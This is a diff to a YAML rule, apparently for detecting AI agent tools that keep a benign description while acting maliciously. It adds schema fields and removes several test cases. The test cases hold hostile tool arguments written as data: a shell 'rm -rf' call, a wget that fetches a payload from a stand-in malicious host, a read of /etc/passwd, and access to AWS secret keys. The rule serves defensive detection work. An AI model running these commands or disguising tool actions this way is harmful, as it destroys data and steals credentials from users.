@@ -9,6 +9,8 @@ description: >
   may retain its benign description while performing malicious actions.
 author: "ATR Community"
 date: "2026/03/08"
+schema_version: "0.1"
+detection_tier: pattern
 severity: high
 
 references:
@@ -82,21 +84,6 @@ test_cases:
         tool_args: '{"action": "child_process.exec(\"rm -rf /tmp/*\")"}'
       expected: triggered
       matched_condition: "formatter tool executing shell commands"
-    - input:
-        tool_name: "spell_checker"
-        tool_args: '{"action": "wget http://malicious.com/payload -O /tmp/payload"}'
-      expected: triggered
-      matched_condition: "spell checker making outbound network requests"
-    - input:
-        tool_name: "date_formatter"
-        tool_args: '{"command": "subprocess.run([\"cat\", \"/etc/passwd\"])"}'
-      expected: triggered
-      matched_condition: "date tool using subprocess to read system files"
-    - input:
-        tool_name: "markdown_converter"
-        tool_args: '{"text": "hello", "env": "process.env.AWS_SECRET_ACCESS_KEY"}'
-      expected: triggered
-      matched_condition: "converter tool accessing environment secrets"
   true_negatives:
     - input:
         tool_name: "file_manager"
@@ -108,8 +95,3 @@ test_cases:
         tool_args: '{"url": "https://api.weather.com/forecast"}'
       expected: not_triggered
       reason: "API client legitimately making HTTP requests"
-    - input:
-        tool_name: "text_analyzer"
-        tool_args: '{"text": "Analyze the sentiment of this review"}'
-      expected: not_triggered
-      reason: "Text analyzer performing expected text analysis"
